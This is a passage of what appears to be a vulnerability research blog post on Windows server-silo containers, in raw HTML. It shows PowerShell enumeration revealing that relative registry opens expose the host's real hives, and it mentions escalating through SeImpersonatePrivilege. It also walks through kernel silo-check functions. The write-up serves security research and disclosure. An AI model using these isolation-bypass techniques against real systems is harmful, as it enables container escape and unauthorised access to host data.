class="c1"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--------&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Ip &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Tcp6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Http &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Directory&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Ip6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;ahcache &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;WMIDataDevice &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;LanmanDatagramReceiver &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Tcp &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;LanmanRedirector &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;DxgKrnl &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;ConDrv &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Null &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;MailslotRedirector &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;NamedPipe &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Device&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Udp6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;VhdHardDisk{5ac9b14d-61f3-4b41-9bbf-a2f5b2d6f182} SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;KsecDD &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;DeviceApi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; SymbolicLink&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;MountPointManager &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Device&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Interestingly most of the device drivers are symbolic links (almost certainly global) instead of being actual device objects. But there are a few real device objects available. &lt;/span&gt;&lt;span&gt;Even the VHD disk volume is a symbolic link to a device outside the container. &lt;/span&gt;&lt;span class="c11"&gt;There&amp;rsquo;s likely to be some things lurking in accessible devices which could be exploited, but I was still in reconnaissance mode.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;What about the registry? The container should be providing its own Registry hives and so there shouldn&amp;rsquo;t be anything accessible outside of that. After a few tests I noticed something very odd.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a5bb25cba1c2e2fc97845b1abf603505733ebfe9"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;ls&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;HKLM:\SOFTWARE&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;|&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;Select-Object&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;----&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Classes&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Clients&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\DefaultUserEnvironment&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\ODBC&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\OpenSSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Policies&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\RegisteredApplications&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Setup&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;ls&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;NtObject:\REGISTRY\MACHINE\SOFTWARE&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;|&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;Select-Object&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;----&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Classes&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Clients&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;DefaultUserEnvironment&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Docker Inc.&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Intel&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Macromedia&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Microsoft&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;ODBC&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;OEM&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;OpenSSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Partner&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Policies&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;RegisteredApplications&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Windows&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;WOW6432Node&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The first command is querying the local machine SOFTWARE hive using the built-in &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_registry_provider"&gt;Registry drive provider&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;. The second command is using my module&amp;rsquo;s object manager provider to list the same hive. If you look closely the list of keys is different between the two commands. Maybe I made a mistake somehow? I checked some other keys, for example the user hive attachment point:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bc8a717c6e3924237eb228e12d843d904386b96c"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;ls&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;NtObject:\REGISTRY\USER&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c16"&gt;|&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;Select-Object&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Name&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;----&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;.DEFAULT&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-19&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-20&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-21-426062036-3400565534-2975477557-1001&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-21-426062036-3400565534-2975477557-1001_Classes&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-21-426062036-3400565534-2975477557-1003&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;S-1-5-18&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Get-NtSid&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Sid&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;User Manager\ContainerUser S-1-5-93-2-2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;No, it still looked wrong. The ContainerUser&amp;rsquo;s SID is &lt;/span&gt;&lt;span class="c2"&gt;S-1-5-93-2-2&lt;/span&gt;&lt;span&gt;, you&amp;rsquo;d expect to see a loaded hive for that user SID. However you don&amp;rsquo;t see one, instead you see &lt;/span&gt;&lt;span class="c2"&gt;S-1-5-21-426062036-3400565534-2975477557-1001&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;which is the SID of the user outside the container. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Something funny was going on. However, this behavior is something I&amp;rsquo;ve seen before. Back in 2016 I reported &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=870"&gt;a bug&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with application hives where you couldn&amp;rsquo;t open the &lt;/span&gt;&lt;span class="c2"&gt;\REGISTRY\A&lt;/span&gt;&lt;span&gt;&amp;nbsp;attachment point directly, but you could if you opened &lt;/span&gt;&lt;span class="c2"&gt;\REGISTRY&lt;/span&gt;&lt;span&gt;&amp;nbsp;then did a relative open to &lt;/span&gt;&lt;span class="c2"&gt;A&lt;/span&gt;&lt;span&gt;. It turns out that by luck my registry enumeration code in the module&amp;rsquo;s drive provider uses relative opens using the native system calls, whereas the PowerShell built-in uses absolute opens through the Win32 APIs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Therefore, this was a manifestation of a similar bug: doing a relative open was ignoring the registry overlays and giving access to the real hive.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This grants a non-administrator user access to any registry key on the host, as long as &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span&gt;can pass the &lt;/span&gt;&lt;span&gt;key&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;access check. You could imagine the host storing some important data in the registry which the container can now read out, however using this to escape the container would be hard. That said, all you need to do is abuse &lt;/span&gt;&lt;span class="c2"&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;to get administrator access and you can immediately start modifying the host&amp;rsquo;s registry hives. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The fact that I had two bugs in less than a day was somewhat concerning, however at least that knowledge can be applied to any mitigation strategy. I thought I should dig a bit deeper into the kernel to see what else I could exploit from a normal user.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.3935jewic6yi"&gt;&lt;span class="c22 c34"&gt;A Little Bit of Reverse Engineering&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;While just doing basic inspection has been surprisingly fruitful it was likely to need some reverse engineering to shake out anything else. I know from previous experience on Desktop Bridge how the registry overlays and object manager redirection works when combined with silos. In the case of Desktop Bridge it uses application silos rather than server silos but they go through similar approaches.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;The main enforcement mechanism used by the kernel to provide the container&amp;rsquo;s isolation is by calling a function to check whether the process is in a silo and doing something different based on the result. I decided to try and track down where the silo state was checked and see if I could find any misuse. You&amp;rsquo;d think the kernel would only have a few functions which would return the current silo state. Unfortunately you&amp;rsquo;d be wrong, the following is a short list of the functions I checked:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2d10e439459e6caf2d122f4072cd975490459881"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;IoGetSilo, IoGetSiloParameters, MmIsSessionInCurrentServerSilo, OBP_GET_SILO_ROOT_DIRECTORY_FROM_SILO, ObGetSiloRootDirectoryPath, ObpGetSilosRootDirectory, PsGetCurrentServerSilo, PsGetCurrentServerSiloGlobals, PsGetCurrentServerSiloName, PsGetCurrentSilo, PsGetEffectiveServerSilo, PsGetHostSilo, PsGetJobServerSilo, PsGetJobSilo, PsGetParentSilo, PsGetPermanentSiloContext, PsGetProcessServerSilo, PsGetProcessSilo, PsGetServerSiloActiveConsoleId, PsGetServerSiloGlobals, PsGetServerSiloServiceSessionId, PsGetServerSiloState, PsGetSiloBySessionId, PsGetSiloContainerId, PsGetSiloContext, PsGetSiloIdentifier, PsGetSiloMonitorContextSlot, PsGetThreadServerSilo, PsIsCurrentThreadInServerSilo, PsIsHostSilo, PsIsProcessInAppSilo, PsIsProcessInSilo, PsIsServerSilo, PsIsThreadInSilo&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;Of course that&amp;rsquo;s not a comprehensive list of functions, but those are the ones that looked the most likely to either return the silo and its properties or check if something was in a silo. Checking the references to these functions wasn&amp;rsquo;t going to be comprehensive, for various reasons:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c38 lst-kix_upj84fi5ja9o-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;We&amp;rsquo;re only checking for bad checks, not the lack of a check.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;The kernel has the structure type definition for the Job object which contains the silo, so the call could easily be inlined.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c25 li-bullet-0"&gt;&lt;span class="c11"&gt;We&amp;rsquo;re only checking the kernel, many of these functions are exported for driver use so could be called by other kernel components that we&amp;rsquo;re not looking at.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The first issue I found was due to a call to &lt;/span&gt;&lt;span class="c2"&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span&gt;. I noticed a reference to the function inside &lt;/span&gt;&lt;span class="c2"&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;which is a function that&amp;rsquo;s responsible for enforcing symlink checks in the registry. At a basic level, registry symbolic links are not allowed to traverse from an untrusted hive to a trusted hive. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;For example if you put a symbolic link in the current user&amp;rsquo;s hive which redirects to the local machine hive the &lt;/span&gt;&lt;span class="c2"&gt;CmpOKToFollowLink&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;will return FALSE when opening the key and the operation will fail. This prevents a user planting symbolic links in their hive and finding a privileged application which will write to that location to elevate privileges.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.846c754c0aacea52cb461bb2ca46a88d06b4a140"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;BOOLEAN CmpOKToFollowLink&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;PCMHIVE SourceHive&lt;/span&gt;&lt;span class="c18 c14"&gt;,&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;PCMHIVE TargetHive&lt;/span&gt;&lt;span class="c18 c14"&gt;)&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c21 c14"&gt;if&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;(&lt;/span&gt;&lt;span class="c8 c14"&gt;PsIsCurrentThreadInServerSilo&lt;/span&gt;&lt;span class="c18 c14"&gt;()&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;||&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18 c14"&gt;!&lt;/span&gt;&lt;span class="c5"&gt;TargetHive &lt;/span&gt;&lt;/p&gt; &lt;p class="c10"&gt;&lt;span class="c8 c14"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;||&lt;/span&gt;&lt;span class="c8 c14"&gt;&amp;nbsp;TargetHive &lt;/span&gt;&lt;span class="c18 